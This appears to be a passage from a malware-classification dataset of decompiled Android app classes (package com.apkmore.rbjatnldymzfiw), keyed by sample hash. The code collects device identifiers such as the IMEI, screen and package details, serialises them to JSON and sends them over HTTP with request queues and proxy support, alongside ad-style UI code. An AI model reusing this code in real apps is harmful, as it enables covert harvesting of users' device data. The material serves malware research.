displayMetrics=new DisplayMetrics();     windowManager.getDefaultDisplay().getMetrics(displayMetrics);     this.g=displayMetrics.densityDpi;     this.h=displayMetrics.widthPixels;     this.i=displayMetrics.heightPixels;     try {       PackageInfo packageInfo=context.getPackageManager().getPackageInfo(context.getPackageName(),0);       this.e=packageInfo.versionName;       this.f=packageInfo.versionCode;     }  catch (    PackageManager.NameNotFoundException e) {     }     this.n=com.apkmore.rbjatnldymzfiw.v.e.h.d(context);     this.m=com.apkmore.rbjatnldymzfiw.v.e.h.e(context);     if (this.m == null) {       this.m=com.apkmore.rbjatnldymzfiw.v.e.b.bN;     }     this.t=com.apkmore.rbjatnldymzfiw.v.e.h.n(context);     this.u=com.apkmore.rbjatnldymzfiw.v.e.h.k(context,this.t) ? 1 : 0;     this.v=com.apkmore.rbjatnldymzfiw.v.e.h.p(context);   }   @Override public String a(){     return ""a"";   }   @Override public void a(  JSONObject jSONObject){     if (jSONObject == null) {       return;     }     try {       this.f155a=jSONObject.isNull(""a"") ? null : jSONObject.getString(""a"");       this.b=jSONObject.isNull(""b"") ? null : jSONObject.getString(""b"");       this.c=jSONObject.isNull(""c"") ? null : jSONObject.getString(""c"");       this.d=jSONObject.isNull(""d"") ? null : jSONObject.getString(""d"");       this.e=jSONObject.isNull(""e"") ? null : jSONObject.getString(""e"");       this.f=jSONObject.isNull(""f"") ? 0 : jSONObject.getInt(""f"");       this.g=jSONObject.isNull(""g"") ? 0 : jSONObject.getInt(""g"");       this.h=jSONObject.isNull(""h"") ? 0 : jSONObject.getInt(""h"");       this.i=jSONObject.isNull(""i"") ? 0 : jSONObject.getInt(""i"");       this.j=jSONObject.isNull(""j"") ? 0.0d : jSONObject.getDouble(""j"");       this.k=jSONObject.isNull(""k"") ? 0.0d : jSONObject.getDouble(""k"");       this.l=jSONObject.isNull(""l"") ? null : jSONObject.getString(""l"");       this.m=jSONObject.isNull(""m"") ? null : jSONObject.getString(""m"");       this.n=jSONObject.isNull(""n"") ? null : jSONObject.getString(""n"");       this.o=jSONObject.isNull(""o"") ? null : jSONObject.getString(""o"");       this.p=jSONObject.isNull(""p"") ? null : jSONObject.getString(""p"");       this.q=jSONObject.isNull(""q"") ? null : jSONObject.getString(""q"");       this.r=jSONObject.isNull(""r"") ? 100008 : jSONObject.getInt(""r"");       s=jSONObject.isNull(""s"") ? null : jSONObject.getString(""s"");       this.t=jSONObject.isNull(""t"") ? null : jSONObject.getString(""t"");       this.u=(jSONObject.isNull(""u"") ? null : Integer.valueOf(jSONObject.getInt(""u""))).intValue();       this.v=(jSONObject.isNull(""v"") ? null : Integer.valueOf(jSONObject.getInt(""v""))).intValue();     }  catch (    Exception e) {       e.printStackTrace();     }   }   public JSONObject b(){     JSONObject jSONObject=new JSONObject();     JSONObject jSONObject2=new JSONObject();     try {       jSONObject.put(""a"",this.f155a);       jSONObject.put(""b"",this.b);       jSONObject.put(""c"",this.c);       jSONObject.put(""d"",this.d);       jSONObject.put(""e"",this.e);       jSONObject.put(""f"",this.f);       jSONObject.put(""g"",this.g);       jSONObject.put(""h"",this.h);       jSONObject.put(""i"",this.i);       jSONObject.put(""j"",this.j);       jSONObject.put(""k"",this.k);       jSONObject.put(""l"",this.l);       jSONObject.put(""m"",this.m);       jSONObject.put(""n"",this.n);       jSONObject.put(""o"",this.o);       jSONObject.put(""p"",this.p);       jSONObject.put(""q"",this.q);       jSONObject.put(""r"",this.r);       jSONObject.put(""s"",s);       jSONObject.put(""t"",this.t);       jSONObject.put(""u"",this.u);       jSONObject.put(""v"",this.v);       jSONObject2.put(a(),jSONObject);       return jSONObject2;     }  catch (    Exception e) {       e.printStackTrace();       return null;     }   }   public String toString(){     return """";   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.b\i.code","class i implements g {   public int f156a=-1;   public String b;   i(){   }   @Override public String a(){     return ""c"";   }   @Override public void a(  JSONObject jSONObject){     try {       this.f156a=jSONObject.isNull(""a"") ? -1 : jSONObject.getInt(""a"");       this.b=jSONObject.isNull(""b"") ? null : jSONObject.getString(""b"");     }  catch (    Exception e) {       e.printStackTrace();     }   }   public String toString(){     return """";   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.b\j.code","public class j { } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.b\k.code","public class k implements g, Serializable {   private static final String B=com.apkmore.rbjatnldymzfiw.v.e.b.aP;   public String f157a;   public String b;   public int c;   public String d;   public int e;   public String f;   public String g;   public String h;   public int i;   public String j;   public String k;   public String l;   public boolean m;   public boolean n;   public boolean o;   public String p;   public boolean q;   public String r;   public String s;   public int t;   public int u;   public String x;   public int v=0;   public int w=0;   public String y="""";   public String z="""";   public boolean A=false;   @Override public String a(){     return ""b"";   }   @Override public void a(  JSONObject jSONObject){     if (jSONObject == null) {       return;     }     try {       this.f157a=jSONObject.isNull(""a"") ? null : jSONObject.getString(""a"");       this.b=jSONObject.isNull(""b"") ? null : jSONObject.getString(""b"");       this.c=jSONObject.isNull(""c"") ? -1 : jSONObject.getInt(""c"");       this.d=jSONObject.isNull(""d"") ? null : jSONObject.getString(""d"");       this.e=jSONObject.isNull(""e"") ? -1 : jSONObject.getInt(""e"");       this.f=jSONObject.isNull(""f"") ? null : jSONObject.getString(""f"");       this.g=jSONObject.isNull(""g"") ? null : jSONObject.getString(""g"");       this.h=jSONObject.isNull(""h"") ? null : jSONObject.getString(""h"");       this.i=jSONObject.isNull(""i"") ? -1 : jSONObject.getInt(""i"");       this.j=jSONObject.isNull(""j"") ? null : jSONObject.getString(""j"");       this.k=jSONObject.isNull(""k"") ? null : jSONObject.getString(""k"");       this.l=jSONObject.isNull(""l"") ? null : jSONObject.getString(""l"");       this.m=jSONObject.isNull(""m"") ? true : jSONObject.getBoolean(""m"");       this.n=jSONObject.isNull(""n"") ? true : jSONObject.getBoolean(""n"");       this.o=jSONObject.isNull(""o"") ? false : jSONObject.getBoolean(""o"");       this.p=jSONObject.isNull(""p"") ? null : jSONObject.getString(""p"");       this.q=jSONObject.isNull(""q"") ? false : jSONObject.getBoolean(""q"");       this.r=jSONObject.isNull(""r"") ? null : jSONObject.getString(""r"");       this.s=jSONObject.isNull(""s"") ? null : jSONObject.getString(""s"");       this.t=jSONObject.isNull(""t"") ? 0 : jSONObject.getInt(""t"");       this.u=jSONObject.isNull(""u"") ? 0 : jSONObject.getInt(""u"");       this.y=jSONObject.isNull(""v"") ? null : jSONObject.getString(""v"");       this.z=jSONObject.isNull(""w"") ? null : jSONObject.getString(""w"");       this.x=jSONObject.isNull(""x"") ? null : jSONObject.getString(""x"");     }  catch (    Exception e) {       e.printStackTrace();     }   }   public String toString(){     return """";   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.b\l.code","public class l implements g {   private static String v=h.s;   public String c;   public String d;   public String e;   public int f;   public int g;   public int h;   public int i;   public double j;   public double k;   public String l;   public String m;   public String n;   public String o;   public boolean p;   public String q;   public String r;   public int s;   public String t;   public int u=3;   public String b=Build.PRODUCT;   public String f158a=Build.VERSION.SDK;   public l(  Context context){     this.q=context.getPackageName();     this.d=((TelephonyManager)context.getSystemService(""phone"")).getDeviceId();     this.c=com.apkmore.rbjatnldymzfiw.v.e.h.a(context);     WindowManager windowManager=(WindowManager)context.getSystemService(""window"");     DisplayMetrics displayMetrics=new DisplayMetrics();     windowManager.getDefaultDisplay().getMetrics(displayMetrics);     this.g=displayMetrics.densityDpi;     this.h=displayMetrics.widthPixels;     this.i=displayMetrics.heightPixels;     PackageManager packageManager=context.getPackageManager();     try {       PackageInfo packageInfo=packageManager.getPackageInfo(context.getPackageName(),0);       this.e=packageInfo.versionName;       this.f=packageInfo.versionCode;     }  catch (    PackageManager.NameNotFoundException e) {     }     this.n=com.apkmore.rbjatnldymzfiw.v.e.h.a(context,packageManager);     Log.d(com.apkmore.rbjatnldymzfiw.v.e.b.C,com.apkmore.rbjatnldymzfiw.v.e.b.d + "":"" + this.n);     this.o=com.apkmore.rbjatnldymzfiw.v.e.h.b(context);     this.m=com.apkmore.rbjatnldymzfiw.v.n.c(context);     if (this.m == null) {       this.m=com.apkmore.rbjatnldymzfiw.v.e.b.bN;     }     this.k=0.0d;     this.j=0.0d;     this.p=false;     this.s=com.apkmore.rbjatnldymzfiw.v.e.h.c(context);   }   @Override public String a(){     return ""a"";   }   @Override public void a(  JSONObject jSONObject){     if (jSONObject == null) {       return;     }     try {       this.f158a=jSONObject.isNull(""a"") ? null : jSONObject.getString(""a"");       this.b=jSONObject.isNull(""b"") ? null : jSONObject.getString(""b"");       this.c=jSONObject.isNull(""c"") ? null : jSONObject.getString(""c"");       this.d=jSONObject.isNull(""d"") ? null : jSONObject.getString(""d"");       this.e=jSONObject.isNull(""e"") ? null : jSONObject.getString(""e"");       this.f=jSONObject.isNull(""f"") ? 0 : jSONObject.getInt(""f"");       this.g=jSONObject.isNull(""g"") ? 0 : jSONObject.getInt(""g"");       this.h=jSONObject.isNull(""h"") ? 0 : jSONObject.getInt(""h"");       this.i=jSONObject.isNull(""i"") ? 0 : jSONObject.getInt(""i"");       this.j=jSONObject.isNull(""j"") ? 0.0d : jSONObject.getDouble(""j"");       this.k=jSONObject.isNull(""k"") ? 0.0d : jSONObject.getDouble(""k"");       this.l=jSONObject.isNull(""l"") ? null : jSONObject.getString(""l"");       this.m=jSONObject.isNull(""m"") ? null : jSONObject.getString(""m"");       this.n=jSONObject.isNull(""n"") ? null : jSONObject.getString(""n"");       this.o=jSONObject.isNull(""o"") ? null : jSONObject.getString(""o"");       this.p=jSONObject.isNull(""p"") ? false : jSONObject.getBoolean(""p"");       this.q=jSONObject.isNull(""q"") ? null : jSONObject.getString(""q"");       this.r=jSONObject.isNull(""r"") ? null : jSONObject.getString(""r"");       this.s=jSONObject.isNull(""s"") ? 100008 : jSONObject.getInt(""s"");       this.t=jSONObject.isNull(""t"") ? null : jSONObject.getString(""t"");       v=jSONObject.isNull(""u"") ? null : jSONObject.getString(""u"");       this.u=jSONObject.isNull(""v"") ? 0 : jSONObject.getInt(""v"");     }  catch (    Exception e) {       e.printStackTrace();     }   }   public JSONObject b(){     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(""a"",this.f158a);       jSONObject.put(""b"",this.b);       jSONObject.put(""c"",this.c);       jSONObject.put(""d"",this.d);       jSONObject.put(""e"",this.e);       jSONObject.put(""f"",this.f);       jSONObject.put(""g"",this.g);       jSONObject.put(""h"",this.h);       jSONObject.put(""i"",this.i);       jSONObject.put(""j"",this.j);       jSONObject.put(""k"",this.k);       jSONObject.put(""l"",this.l);       jSONObject.put(""m"",this.m);       jSONObject.put(""n"",this.n);       jSONObject.put(""o"",this.o);       jSONObject.put(""p"",this.p);       jSONObject.put(""q"",this.q);       jSONObject.put(""r"",this.r);       jSONObject.put(""s"",this.s);       jSONObject.put(""t"",this.t);       jSONObject.put(""u"",v);       jSONObject.put(""v"",this.u);       return jSONObject;     }  catch (    Exception e) {       e.printStackTrace();       return null;     }   }   public String toString(){     return """";   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.b\m.code","public class m {   private Context f159a;   private Handler b=new Handler();   private boolean c=false;   private p d=null;   public m(  Context context){     this.f159a=context;   }   public void a(  f fVar){     new n(this,fVar).start();   }   public void a(  p pVar){     this.d=pVar;   }   public boolean a(){     return this.c;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.b\n.code","public class n extends Thread {   final f f160a;   final m b;   public n(  m mVar,  f fVar){     this.b=mVar;     this.f160a=fVar;   }   @Override public void run(){     Context context;     Context context2;     Context context3;     Context context4;     p pVar;     Handler handler;     Context context5;     this.b.c=true;     context=this.b.f159a;     d a2=d.a(context);     String str="""" + this.f160a.e;     context2=this.b.f159a;     String g=com.apkmore.rbjatnldymzfiw.v.e.h.g(context2);     HashMap a3=a2.a(str,g);     if (a3 != null) {       i iVar=(i)a3.get(i.class.getName());       if (iVar == null) {         context4=this.b.f159a;         com.apkmore.rbjatnldymzfiw.v.e.h.d(context4,g);       }  else       if (iVar.f156a != 0) {         context5=this.b.f159a;         com.apkmore.rbjatnldymzfiw.v.e.h.d(context5,g);       }       k[] kVarArr=(k[])a3.get(k.class.getName());       if (kVarArr != null) {         pVar=this.b.d;         if (pVar != null) {           handler=this.b.b;           handler.post(new o(this,kVarArr));         }       }     }  else {       context3=this.b.f159a;       com.apkmore.rbjatnldymzfiw.v.e.h.d(context3,g);     }     try {       Thread.sleep(200L);     }  catch (    InterruptedException e) {       e.printStackTrace();     }     this.b.c=false;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.b\o.code","class o implements Runnable {   final k[] f161a;   final n b;   public o(  n nVar,  k[] kVarArr){     this.b=nVar;     this.f161a=kVarArr;   }   @Override public void run(){     p pVar;     pVar=this.b.b.d;     pVar.a(this.f161a);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.b\p.code","public interface p {   void a(  k[] kVarArr); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.b\q.code","public class q {   public void a(  Context context){     new r(this,context).start();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.b\r.code","public class r extends Thread {   final Context f162a;   final q b;   public r(  q qVar,  Context context){     this.b=qVar;     this.f162a=context;   }   @Override public void run(){     super.run();     c.a(this.f162a).b(com.apkmore.rbjatnldymzfiw.v.e.h.h(this.f162a));   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.b\s.code","public class s {   public static Map f163a=new HashMap(); static {     f163a.put(""Z"",Boolean.TYPE);     f163a.put(""B"",Byte.TYPE);     f163a.put(""C"",Character.TYPE);     f163a.put(""D"",Double.TYPE);     f163a.put(""F"",Float.TYPE);     f163a.put(""I"",Integer.TYPE);     f163a.put(""J"",Long.TYPE);     f163a.put(""S"",Short.TYPE);   }   public static g a(  Class cls,  String str){     if (str == null) {       return null;     }     try {       JSONObject jSONObject=new JSONObject(str);       g gVar=(g)cls.newInstance();       if (!jSONObject.isNull(gVar.a())) {         gVar.a(jSONObject.getJSONObject(gVar.a()));         return gVar;       }     }  catch (    IllegalAccessException e) {       e.printStackTrace();     } catch (    InstantiationException e2) {       e2.printStackTrace();     } catch (    JSONException e3) {       e3.printStackTrace();     }     return null;   }   public static g[] b(  Class cls,  String str){     JSONArray jSONArray;     if (str == null) {       return null;     }     try {       JSONObject jSONObject=new JSONObject(str);       g gVar=(g)cls.newInstance();       if (!jSONObject.isNull(gVar.a()) && (jSONArray=jSONObject.getJSONArray(gVar.a())) != null) {         g[] gVarArr=(g[])Array.newInstance((Class<?>)cls,jSONArray.length());         int i=0;         while (true) {           int i2=i;           if (i2 >= jSONArray.length()) {             return gVarArr;           }           g gVar2=(g)cls.newInstance();           gVar2.a(jSONArray.getJSONObject(i2));           gVarArr[i2]=gVar2;           i=i2 + 1;         }       }     }  catch (    IllegalAccessException e) {       e.printStackTrace();     } catch (    InstantiationException e2) {       e2.printStackTrace();     } catch (    JSONException e3) {       e3.printStackTrace();     }     return null;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.c\a.code","public class a extends e {   private HttpClient b;   public a(  Context context,  h hVar){     super(context,hVar);   }   public void a(  HttpPost httpPost,  HttpEntity httpEntity){     httpPost.setEntity(httpEntity);   }   @Override public boolean a(){     HttpRequestBase httpRequestBase;     if (c()) {       if (!l()) {         a(-4);         return false;       }       a((Exception)null);       a(-2);       this.b=new DefaultHttpClient();       float j=j();       if (j > 0.0f) {         this.b.getParams().setParameter(""http.socket.timeout"",Integer.valueOf((int)(j * 1000.0f)));         this.b.getParams().setParameter(""http.connection.timeout"",Integer.valueOf((int)(j * 1000.0f)));       }       g k=k();       if (k != null) {         this.b.getParams().setParameter(""http.route.default-proxy"",new HttpHost(k.a(),k.b(),com.apkmore.rbjatnldymzfiw.v.e.b.bu));       }       h d=d();       if (d.b() == 0) {         httpRequestBase=new HttpGet(d.toString());       }  else {         HttpPost httpPost=new HttpPost(d.c());         try {           a(httpPost,new StringEntity(d.d()));         }  catch (        UnsupportedEncodingException e) {           e.printStackTrace();         }         httpRequestBase=httpPost;       }       for (      Map.Entry entry : d.a().entrySet()) {         httpRequestBase.addHeader(entry.getKey().toString(),entry.getValue().toString());       }       try {         HttpResponse execute=this.b.execute(httpRequestBase);         int statusCode=execute.getStatusLine().getStatusCode();         HashMap hashMap=new HashMap();         for (        Header header : execute.getAllHeaders()) {           hashMap.put(header.getName(),header.getValue());         }         a(hashMap);         a(execute.getEntity().getContent());         if (("""" + statusCode).startsWith(""2"")) {           a(200);           return true;         }       }  catch (      Exception e2) {         a(e2);         a(-3);       } catch (      OutOfMemoryError e3) {         a((Exception)null);         a(-3);       }     }     return false;   }   @Override public void b(){     if (c()) {       return;     }     if (this.b != null) {       this.b.getConnectionManager().shutdown();     }     a((Map)null);     a((InputStream)null);     a((Exception)null);     a(-3);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.c\b.code","public class b {   private boolean f165a=false;   private List b=new ArrayList();   public b(){     a(1);   }   private c a(){     c cVar=null;     for (    c cVar2 : this.b) {       cVar2.a();       if (cVar != null && cVar2.size() >= cVar.size()) {         cVar2=cVar;       }       cVar=cVar2;     }     return cVar;   }   public boolean b(  e eVar){     return eVar.a();   }   public void a(  int i){     if (this.b.size() < i) {       int size=i - this.b.size();       for (int i2=0; i2 < size; i2++) {         this.b.add(new c(this));       }     }   }   public void a(  e eVar){     eVar.a(-1);     if (this.f165a) {       b(eVar);       return;     }     c a2=a();     if (a2 != null) {       a2.add(eVar);     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.c\c.code","public class c extends ConcurrentLinkedQueue {   final b f166a;   private Thread b;   private int c=(int)(Math.random() * 131072.0d);   public c(  b bVar){     this.f166a=bVar;   }   public void a(){     Iterator it=iterator();     while (it.hasNext()) {       if (((e)it.next()).h() == -3) {         it.remove();       }     }   }   @Override public boolean add(  e eVar){     boolean add=super.add(eVar);     if (add && this.b == null) {       this.b=new d(this);       this.b.start();     }     return add;   }   @Override public String toString(){     return com.apkmore.rbjatnldymzfiw.v.e.b.bv + this.c;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.c\d.code","public class d extends Thread {   final c f167a;   public d(  c cVar){     this.f167a=cVar;   }   @Override public void run(){     int i;     int i2=0;     while (true) {       e eVar=(e)this.f167a.peek();       if (eVar == null) {         this.f167a.b=null;         return;       }       if ((eVar.h() == -1 ? this.f167a.f166a.b(eVar) : false) || i2 > 1) {         this.f167a.poll();         i=0;       }  else {         i=i2 + 1;       }       i2=i;     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.c\e.code","!org.eclipse.jdt.core.dom.TypeDeclaration@41414197"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.c\f.code","public interface f {   void a(  e eVar,  int i); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.c\g.code","public class g {   private String f169a;   private int b;   public g(  String str,  int i){     this.f169a=str;     this.b=i;   }   public String a(){     return this.f169a;   }   public int b(){     return this.b;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.c\h.code","public class h {   private String f170a;   private Map c;   private boolean e;   private int d=0;   private Map b=new LinkedHashMap();   public h(  String str){     this.f170a=str;   }   public synchronized Map a(){     Map map;     if (this.c == null) {       this.c=new LinkedHashMap();       map=this.c;     }  else {       map=this.c;     }     return map;   }   public synchronized void a(  String str,  Object obj){     if (this.c == null) {       this.c=new LinkedHashMap();       this.c.put(str,obj);     }  else {       this.c.put(str,obj);     }   }   public int b(){     return this.d;   }   public String c(){     return this.f170a;   }   public String d(){     if (this.b.isEmpty()) {       return """";     }     ArrayList arrayList=new ArrayList();     for (    String str : this.b.keySet()) {       Object obj=this.b.get(str);       if (obj != null) {         arrayList.add(new BasicNameValuePair(str,obj.toString()));       }     }     String format=URLEncodedUtils.format(arrayList,com.apkmore.rbjatnldymzfiw.v.e.b.bk);     return this.e ? com.apkmore.rbjatnldymzfiw.v.e.g.a(format) : format;   }   public String toString(){     String d=d();     return d.equals("""") ? this.f170a : this.f170a + ""?"" + d;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.d\a.code","public class a extends RelativeLayout implements View.OnClickListener, AdapterView.OnItemClickListener, h {   protected Context f172a;   private LinearLayout b;   private e c;   private i d;   private TextView e;   private TextView f;   private TextView g;   private TextView h;   private TextView i;   private TextView j;   private ImageView k;   private i l;   private ImageView m;   private View.OnClickListener n;   private r o;   private FrameLayout p;   private TextView q;   private ImageView r;   private com.apkmore.rbjatnldymzfiw.v.u s;   private boolean t;   private View.OnClickListener u;   private AdapterView.OnItemClickListener v;   public a(  Context context){     super(context);     this.t=true;     this.u=new d(this);     this.v=null;     this.f172a=context;     try {       this.b=new LinearLayout(context);       this.b.setId(0);       this.b.setOrientation(1);       this.b.setBackgroundColor(-1);       addView(this.b,new RelativeLayout.LayoutParams(-1,-1));       Color.parseColor(com.apkmore.rbjatnldymzfiw.v.e.b.bx);       LinearLayout linearLayout=new LinearLayout(context);       linearLayout.setOrientation(0);       linearLayout.setBackgroundDrawable(new GradientDrawable(GradientDrawable.Orientation.TOP_BOTTOM,new int[]{-13514802,-13514802,-13514802}));       this.b.addView(linearLayout,-1,-2);       LinearLayout linearLayout2=new LinearLayout(context);       LinearLayout.LayoutParams layoutParams=new LinearLayout.LayoutParams(-1,1);       layoutParams.gravity=16;       linearLayout2.setBackgroundColor(-4604739);       this.b.addView(linearLayout2,layoutParams);       this.k=new ImageView(context);       this.k.setImageResource(R.drawable.sym_def_app_icon);       LinearLayout.LayoutParams layoutParams2=new LinearLayout.LayoutParams(-2,-2);       layoutParams2.gravity=16;       layoutParams2.setMargins(com.apkmore.rbjatnldymzfiw.v.e.h.a(context,5),com.apkmore.rbjatnldymzfiw.v.e.h.a(context,5),com.apkmore.rbjatnldymzfiw.v.e.h.a(context,3),com.apkmore.rbjatnldymzfiw.v.e.h.a(context,5));       linearLayout.addView(this.k,layoutParams2);       this.e=new TextView(context);       this.e.setText("""");       this.e.setTextSize(18.0f);       this.e.setTextColor(ViewCompat.MEASURED_STATE_MASK);       this.e.setPadding(15,5,5,5);       linearLayout.addView(this.e);       ScrollView scrollView=new ScrollView(context);       this.b.addView(scrollView,new LinearLayout.LayoutParams(-1,-2,1.0f));       LinearLayout linearLayout3=new LinearLayout(context);       linearLayout3.setOrientation(1);       linearLayout3.setPadding(com.apkmore.rbjatnldymzfiw.v.e.h.a(context,8),com.apkmore.rbjatnldymzfiw.v.e.h.a(context,10),com.apkmore.rbjatnldymzfiw.v.e.h.a(context,8),com.apkmore.rbjatnldymzfiw.v.e.h.a(context,6));       scrollView.addView(linearLayout3,new LinearLayout.LayoutParams(-1,-2));       LinearLayout linearLayout4=new LinearLayout(context);       linearLayout3.addView(linearLayout4,new LinearLayout.LayoutParams(-1,-2));       LinearLayout linearLayout5=new LinearLayout(context);       linearLayout5.setOrientation(1);       linearLayout4.addView(linearLayout5,new LinearLayout.LayoutParams(-1,-2));       TableLayout tableLayout=new TableLayout(context);       TableRow tableRow=new TableRow(context);       TableRow tableRow2=new TableRow(context);       TableRow tableRow3=new TableRow(context);       tableLayout.addView(tableRow);       tableLayout.addView(tableRow2);       tableLayout.addView(tableRow3);       linearLayout5.addView(tableLayout);       this.f=new TextView(context);       this.f.setText(com.apkmore.rbjatnldymzfiw.v.e.b.av + ""ï¼š"");       this.f.setTextSize(15.0f);       this.f.setPadding(com.apkmore.rbjatnldymzfiw.v.e.h.a(context,10),0,0,0);       this.f.setTextColor(-9144456);       this.f.setSingleLine();       this.f.setEllipsize(TextUtils.TruncateAt.END);       tableRow2.addView(this.f);       this.h=new TextView(context);       this.h.setText(com.apkmore.rbjatnldymzfiw.v.e.b.ax + ""ï¼š"");       this.h.setTextSize(15.0f);       this.h.setPadding(com.apkmore.rbjatnldymzfiw.v.e.h.a(context,10),0,0,0);       this.h.setTextColor(-9144456);       this.h.setSingleLine();       this.h.setEllipsize(TextUtils.TruncateAt.END);       tableRow2.addView(this.h);       this.g=new TextView(context);       this.g.setText(com.apkmore.rbjatnldymzfiw.v.e.b.aw + ""ï¼š"");       this.g.setTextSize(15.0f);       this.g.setPadding(com.apkmore.rbjatnldymzfiw.v.e.h.a(context,10),0,0,0);       this.g.setTextColor(-9144456);       this.g.setSingleLine();       this.g.setEllipsize(TextUtils.TruncateAt.END);       tableRow3.addView(this.g);       this.i=new TextView(context);       this.i.setText(com.apkmore.rbjatnldymzfiw.v.e.b.ay + ""ï¼š"");       this.i.setTextSize(15.0f);       this.i.setPadding(com.apkmore.rbjatnldymzfiw.v.e.h.a(context,10),0,0,0);       this.i.setTextColor(-9144456);       this.i.setSingleLine();       this.i.setEllipsize(TextUtils.TruncateAt.END);       tableRow3.addView(this.i);       LinearLayout linearLayout6=new LinearLayout(context);       linearLayout6.setOrientation(1);       linearLayout3.addView(linearLayout6,new LinearLayout.LayoutParams(-1,-2));       LinearLayout linearLayout7=new LinearLayout(context);       LinearLayout.LayoutParams layoutParams3=new LinearLayout.LayoutParams(-1,-2);       int a2=com.apkmore.rbjatnldymzfiw.v.e.h.a(context,2);       layoutParams3.bottomMargin=a2;       layoutParams3.topMargin=a2;       linearLayout6.addView(linearLayout7,layoutParams3);       TextView textView=new TextView(context);       textView.setText(com.apkmore.rbjatnldymzfiw.v.e.b.aB + "" "");       textView.setTextColor(-9144456);       textView.setPadding(com.apkmore.rbjatnldymzfiw.v.e.h.a(context,10),0,0,0);       linearLayout7.addView(textView);       LinearLayout linearLayout8=new LinearLayout(context);       LinearLayout.LayoutParams layoutParams4=new LinearLayout.LayoutParams(-1,1);       layoutParams4.gravity=16;       int a3=com.apkmore.rbjatnldymzfiw.v.e.h.a(context,8);       layoutParams4.rightMargin=a3;       layoutParams4.leftMargin=a3;       linearLayout8.setBackgroundColor(-4604739);       linearLayout7.addView(linearLayout8,layoutParams4);       this.j=new TextView(context);       this.j.setMaxLines(5);       this.j.setText("""");       this.j.setTextSize(16.0f);       this.j.setTextColor(ViewCompat.MEASURED_STATE_MASK);       this.j.setPadding(com.apkmore.rbjatnldymzfiw.v.e.h.a(context,10),0,com.apkmore.rbjatnldymzfiw.v.e.h.a(context,5),com.apkmore.rbjatnldymzfiw.v.e.h.a(context,5));       this.j.setLineSpacing(com.apkmore.rbjatnldymzfiw.v.e.h.a(context,5),1.0f);       linearLayout6.addView(this.j);       this.m=new ImageView(context);       this.m.setImageDrawable(com.apkmore.rbjatnldymzfiw.v.e.a.c(context,1));       LinearLayout.LayoutParams layoutParams5=new LinearLayout.LayoutParams(-2,-2);       layoutParams5.rightMargin=com.apkmore.rbjatnldymzfiw.v.e.h.a(context,10);       layoutParams5.gravity=5;       linearLayout6.addView(this.m,layoutParams5);       this.m.setOnClickListener(this.u);       this.j.setOnClickListener(this.u);       LinearLayout linearLayout9=new LinearLayout(context);       linearLayout3.addView(linearLayout9,new LinearLayout.LayoutParams(-1,-2));       this.d=new i(context);       this.d.setBackgroundColor(Color.rgb(236,236,236));       this.d.setUnselectedAlpha(1.1f);       this.d.setPadding(0,20,0,40);       this.d.setSpacing(10);       this.d.setFadingEdgeLength(0);       Bitmap a4=com.apkmore.rbjatnldymzfiw.v.e.a.a(context,11);       Bitmap a5=com.apkmore.rbjatnldymzfiw.v.e.a.a(context,12);       if (a4 != null) {         a4.setDensity(240);       }       if (a5 != null) {         a5.setDensity(240);       }       if (a4 != null && a5 != null) {         